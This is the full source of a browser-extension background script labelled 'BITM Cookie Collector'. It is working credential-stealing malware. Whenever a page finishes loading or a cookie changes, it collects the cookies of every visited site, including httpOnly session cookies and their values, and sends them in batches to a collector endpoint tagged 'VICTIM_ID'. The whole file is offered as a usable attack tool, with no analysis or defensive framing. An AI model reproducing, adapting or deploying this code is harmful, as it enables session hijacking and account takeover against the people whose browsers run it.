console.log('BITM Cookie Collector - Background Script Loaded');

const COLLECTOR_URL = 'http://127.0.0.1:8080/VICTIM_ID';
const MAX_COOKIES_PER_EVENT = 40;
const MAX_OBSERVED_COOKIES = 4096;
const MAX_DUMPED_ORIGINS = 1024;
const dumpedOrigins = new Set();
const observedCookies = new Set();
const pendingCookies = new Set();

browser.cookies.onChanged.addListener((changeInfo) => {
    if (changeInfo.removed) return;
    sendChangedCookie(changeInfo.cookie).catch((err) => {
        console.error('Failed to process changed cookie:', err);
    });
});

browser.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete' || !tab.url) return;
    dumpCookiesForTab(tab.url).catch((err) => {
        console.error('Failed to dump cookies for tab:', err);
    });
});

async function sendChangedCookie(cookie) {
    const identity = cookieIdentity(cookie);
    if (observedCookies.has(identity) || pendingCookies.has(identity)) return;
    pendingCookies.add(identity);

    try {
        const hostname = normalizeDomain(cookie.domain);
        const sent = await sendEvent({
            event_type: 'cookie_captured',
            timestamp: new Date().toISOString(),
            title: 'Cookie captured',
            description: `${cookie.name} from ${hostname}`,
            url: cookieUrl(cookie),
            hostname,
            payload: serializeCookie(cookie)
        });

        if (sent) rememberCookies([identity]);
    } finally {
        pendingCookies.delete(identity);
    }
}

async function dumpCookiesForTab(tabUrl) {
    let url;
    try {
        url = new URL(tabUrl);
    } catch {
        return;
    }

    if (url.protocol !== 'http:' && url.protocol !== 'https:') return;
    if (dumpedOrigins.has(url.origin)) return;

    const cookies = await browser.cookies.getAll({ url: url.href });
    const unseenCookies = cookies.filter((cookie) => {
        const identity = cookieIdentity(cookie);
        return !observedCookies.has(identity) && !pendingCookies.has(identity);
    });

    if (unseenCookies.length === 0) {
        rememberOrigin(url.origin);
        return;
    }

    for (let offset = 0; offset < unseenCookies.length; offset += MAX_COOKIES_PER_EVENT) {
        const batch = unseenCookies.slice(offset, offset + MAX_COOKIES_PER_EVENT);
        const identities = batch.map(cookieIdentity);
        identities.forEach((identity) => pendingCookies.add(identity));
        const sent = await sendEvent({
            event_type: 'cookie_captured',
            timestamp: new Date().toISOString(),
            url: url.href,
            hostname: url.hostname,
            title: 'Cookies bulk dump',
            description: `Dumped ${batch.length} existing cookies for ${url.hostname}`,
            payload: {
                cookies: batch.map(serializeCookie),
                count: batch.length
            }
        });

        identities.forEach((identity) => pendingCookies.delete(identity));
        if (!sent) return;
        rememberCookies(identities);
    }

    rememberOrigin(url.origin);
}

function serializeCookie(cookie) {
    return {
        name: cookie.name,
        domain: cookie.domain,
        path: cookie.path,
        value: cookie.value,
        expires: cookie.expirationDate
            ? new Date(cookie.expirationDate * 1000).toISOString()
            : null,
        httpOnly: cookie.httpOnly,
        secure: cookie.secure,
        sameSite: cookie.sameSite,
        hostOnly: cookie.hostOnly,
        session: cookie.session,
        storeId: cookie.storeId
    };
}

function cookieIdentity(cookie) {
    return [
        cookie.storeId || '',
        cookie.domain || '',
        cookie.path || '/',
        cookie.name || '',
        cookie.value || ''
    ].join('|');
}

function normalizeDomain(domain) {
    return String(domain || '').replace(/^\./, '');
}

function cookieUrl(cookie) {
    const scheme = cookie.secure ? 'https' : 'http';
    const path = String(cookie.path || '/').startsWith('/') ? cookie.path || '/' : `/${cookie.path}`;
    return `${scheme}://${normalizeDomain(cookie.domain)}${path}`;
}

function rememberCookies(identities) {
    identities.forEach((identity) => observedCookies.add(identity));
    while (observedCookies.size > MAX_OBSERVED_COOKIES) {
        observedCookies.delete(observedCookies.values().next().value);
    }
}

function rememberOrigin(origin) {
    dumpedOrigins.add(origin);
    if (dumpedOrigins.size > MAX_DUMPED_ORIGINS) {
        dumpedOrigins.delete(dumpedOrigins.values().next().value);
    }
}

async function sendEvent(payload) {
    try {
        const response = await fetch(`${COLLECTOR_URL}/events`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        return true;
    } catch (err) {
        console.error(`Failed to send ${payload.event_type}:`, err.message);
        return false;
    }
}
